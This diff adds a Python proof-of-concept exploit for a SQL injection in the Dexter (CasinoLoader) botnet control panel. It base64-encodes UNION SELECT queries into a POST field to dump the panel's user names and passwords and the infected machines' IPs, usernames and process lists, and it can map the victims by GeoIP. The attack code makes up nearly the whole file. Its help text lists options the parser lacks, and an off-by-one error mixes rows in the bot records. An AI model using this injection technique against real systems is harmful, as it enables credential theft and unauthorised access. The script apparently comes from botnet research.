@@ -1,0 +1,193 @@
+# Exploit Title: Dexter (CasinoLoader) Panel SQLi
+# Date: Feb, 13, 2014
+# Exploit Author: Brian Wallace (@botnet_hunter)
+# Version: CasinoLoader
+# Tested on: Windows 7, Ubuntu, Debian
+import pycurl
+import urllib
+import cStringIO
+import base64
+import argparse
+import sys
+import string
+import pygeoip
+
+version = "0.1-http_bots-PoC"
+
+
+def PrintHelp():
+    global version
+    print "usage: dexter.PoC.py [-h] [action] [gateway url]"
+    print ""
+    print "Dexter CasinoLoader BAMF PoC v" + version
+    print "Exploiting CasinoLoader panels for information"
+    print "By Brian Wallace (@botnet_hunter)"
+    print ""
+    print "arguments:"
+    print "  action        Actions to be taken against the botnet (default: dump)"
+    print "                dump - Print configuration information obtained from source file"
+    print "                drop - Execute a command to make the bot scripts exit"
+    print "  source        Path to non-obfuscated source code for the target bot (default: stdin)"
+    print ""
+    print("GPS:")
+    print("  -m MaxMind Location           Location of Maxmind database files (default .)")
+    print ""
+    print "  -h, --help    Print this message"
+    print ""
+
+
+class DexterPanel:
+    def __init__(self, gateway_url):
+        self.gateway_url = gateway_url
+
+    @staticmethod
+    def _get_field(gateway, table, column, row):
+        buf = cStringIO.StringIO()
+        c = pycurl.Curl()
+        c.setopt(c.URL, gateway)
+        page = "' AND 1=2 UNION ALL SELECT 1," + column + ",3 FROM " + table + " LIMIT 1 OFFSET " + str(row) + " -- --"
+        params = urllib.urlencode({'val': 'AA==', 'page': base64.b64encode(page)})
+        c.setopt(c.POSTFIELDS, params)
+        c.setopt(c.HEADERFUNCTION, buf.write)
+        c.perform()
+
+        val = buf.getvalue()
+        cookie = None
+        for line in val.split('\n'):
+            line = line.strip()
+            if line.count('Set-Cookie:') > 0 and line.count("response") > 0:
+                cookie = line
+                cookie = cookie[cookie.find('=') + 1:]
+                cookie = urllib.unquote(cookie)
+                cookie = base64.b64decode(cookie)
+                cookie = cookie[1:]
+                cookie = cookie[:-2]
+                break
+        buf.close()
+        return cookie
+
+    def get_all_user_details(self):
+        count = 0
+        users = []
+        while True:
+            user = self._get_field(self.gateway_url, 'users', 'name', count)
+            if user is None or user == "":
+                break
+            password = self._get_field(self.gateway_url, 'users', 'password', count)
+            count += 1
+            users.append({'user': user, 'password': password})
+        return users
+
+    def get_all_bot_details(self):
+        count = 0
+        bots = []
+        while True:
+            user = self._get_field(self.gateway_url, 'bots', 'RemoteIP', count)
+            if user is None or user == "":
+                break
+            count += 1
+            bots.append({'RemoteIP': user,
+                         'UID': self._get_field(self.gateway_url, 'bots', 'UID', count),
+                         'Version': self._get_field(self.gateway_url, 'bots', 'Version', count),
+                         'Username': self._get_field(self.gateway_url, 'bots', 'Username', count),
+                         'Computername': self._get_field(self.gateway_url, 'bots', 'Computername', count),
+                         'UserAgent': self._get_field(self.gateway_url, 'bots', 'UserAgent', count),
+                         'OS': self._get_field(self.gateway_url, 'bots', 'OS', count),
+                         'Architecture': self._get_field(self.gateway_url, 'bots', 'Architecture', count),
+                         'Idle Time': self._get_field(self.gateway_url, 'bots', 'Idle Time', count),
+                         'Process List': self._get_field(self.gateway_url, 'bots', 'Process List', count),
+                         'LastVisit': self._get_field(self.gateway_url, 'bots', 'LastVisit', count),
+                         'LastCommand': self._get_field(self.gateway_url, 'bots', 'LastCommand', count)})
+        return bots
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(add_help=False)
+    parser.add_argument('action', nargs='?', type=str, default="dump", help="Actions to be taken against pBots (default: dump)", choices=["dump", "graph"])
+    parser.add_argument('gateway', nargs='?', type=str, default=None, help="URL to Dexter bot gateway")
+    parser.add_argument('-m', metavar='maxmind', type=str, nargs='?', default='./GeoLiteCity.dat')
+    parser.add_argument('-h', '--help', default=False, required=False, action='store_true')
+
+    args = parser.parse_args()
+
+    if args.help or args.gateway is None:
+        PrintHelp()
+        sys.exit()
+
+    if args.action == "dump":
+        url = args.gateway
+        dex = DexterPanel(url)
+        print "User details: %s" % dex.get_all_user_details()
+        print "Bot details: %s" % dex.get_all_bot_details()
+    elif args.action == "graph":
+        url = args.gateway
+        dex = DexterPanel(url)
+        bots = dex.get_all_bot_details()
+
+        #load Maxmind
+        sys.stderr.write('Loading MaxMind Database\n')
+        gi = pygeoip.GeoIP(args.m)
+
+        nodes = {}
+        connections = []
+
+        nodes["C2"] = {"id": 0, "label": "C2", "mod": 0}
+        highestnode = 1
+
+        #loop through all bots
+        for bot in bots:
+            ip = bot["RemoteIP"]
+            geoip = gi.record_by_addr(ip)
+            node = {"id": highestnode, "label": ip, "host": ip, "mod": 1}
+            highestnode += 1
+            if geoip is not None:
+                node['lat'] = geoip["latitude"]
+                node['lng'] = geoip["longitude"]
+                nodes[ip] = node
+                connections.append([node['id'], 0])
+
+        print('<?xml version="1.0" encoding="UTF-8"?>')
+        print('<gexf xmlns="http://www.gexf.net/1.2draft" version="1.2">')
+        print('    <meta lastmodifieddate="2009-03-20">')
+        print(('        <creator>' + "bwall" + '</creator>'))
+        print('        <description></description>')
+        print('    </meta>')
+        print('    <graph mode="static" defaultedgetype="directed">')
+        print('    <attributes class="node" mode="static">')
+        print('      <attribute id="modularity_class" title="Modularity Class" type="integer"></attribute>')
+        print('      <attribute id="lat" title="lat" type="double"></attribute>')
+        print('      <attribute id="lng" title="lng" type="double"></attribute>')
+        print('    </attributes>')
+        print('        <nodes>')
+
+        for name, node in list(nodes.items()):
+            if 'lat' in node:
+                print(('            <node id="' + str(node['id']) + '" label="' +
+                    node['label'] + '">'))
+                print('                <attvalues>')
+                print(('                    <attvalue for="modularity_class" value="' +
+                    str(node['mod']) + '"></attvalue>'))
+                print('                     <attvalue for="lat" value="' + str(node['lat']) + '"></attvalue>')
+                print('                     <attvalue for="lng" value="' + str(node['lng']) + '"></attvalue>')
+                print('                </attvalues>')
+                print('            </node>')
+            else:
+                print(('            <node id="' + str(node['id']) + '" label="' +
+                    node['label'] + '">'))
+                print('                <attvalues>')
+                print(('                    <attvalue for="modularity_class" value="' +
+                    str(node['mod']) + '"></attvalue>'))
+                print('                     <attvalue for="lat" value="0"></attvalue>')
+                print('                     <attvalue for="lng" value="0"></attvalue>')
+                print('                </attvalues>')
+                print('            </node>')
+        print('        </nodes>')
+        print('        <edges>')
+        count = 0
+        for node in connections:
+            print(('            <edge id="' + str(count) + '" source="' + str(node[0]) +
+                 '" target="' + str(node[1]) + '" />'))
+            count += 1
+        print('        </edges>')
+        print('    </graph>')
+        print('</gexf>')
